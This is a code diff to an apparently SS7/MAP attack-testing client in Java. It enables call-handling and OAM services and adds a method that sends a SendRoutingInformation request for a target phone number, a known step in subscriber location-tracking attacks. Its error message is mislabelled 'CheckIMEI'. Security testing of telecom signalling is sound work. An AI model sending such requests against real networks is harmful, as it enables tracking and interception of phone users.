@@ -456,10 +456,19 @@ public class TestAttackClient extends AttackTesterBase implements Stoppable, MAP
 
         if(this.testerHost.getInstance_L2().intValue() == Instance_L2.VAL_SCCP) {
             MAPProvider mapProvider = this.mapMan.getMAPStack().getMAPProvider();
+
             mapProvider.getMAPServiceSms().acivate();
             mapProvider.getMAPServiceSms().addMAPServiceListener(this);
+
             mapProvider.getMAPServiceMobility().acivate();
             mapProvider.getMAPServiceMobility().addMAPServiceListener(this);
+
+            mapProvider.getMAPServiceCallHandling().acivate();
+            mapProvider.getMAPServiceCallHandling().addMAPServiceListener(this);
+
+            mapProvider.getMAPServiceOam().acivate();
+            mapProvider.getMAPServiceOam().addMAPServiceListener(this);
+
             mapProvider.addMAPDialogListener(this);
         } else {
             ISUPProvider isupProvider = this.testerHost.getIsupMan().getIsupStack().getIsupProvider();
@@ -1772,6 +1781,27 @@ public class TestAttackClient extends AttackTesterBase implements Stoppable, MAP
     @Override
     public void onSendRoutingInformationResponse(SendRoutingInformationResponse response) {
 
+    }
+
+    public void performSendRoutingInformation(ISDNAddressString msisdn) {
+        MAPProvider mapProvider = this.mapMan.getMAPStack().getMAPProvider();
+        MAPParameterFactory parameterFactory = mapProvider.getMAPParameterFactory();
+
+        MAPApplicationContext applicationContext = MAPApplicationContext.getInstance(MAPApplicationContextName.locationInfoRetrievalContext, MAPApplicationContextVersion.version3);
+        try {
+            MAPDialogCallHandling curDialog = mapProvider.getMAPServiceCallHandling().createNewDialog(applicationContext,
+                    this.mapMan.createOrigAddress(),
+                    null,
+                    this.mapMan.createDestAddress(),
+                    null);
+
+            curDialog.addSendRoutingInformationRequest(msisdn, null, 0, null, false, 0, null, null, null, null, null,
+                    null, false, null, null, false, 0, null, null, false, null, false, false, false, false, null, null,
+                    null, false, null);
+            curDialog.send();
+        } catch (MAPException ex) {
+            System.out.println("Error when sending CheckIMEI Req: " + ex.toString());
+        }
     }
 
     @Override
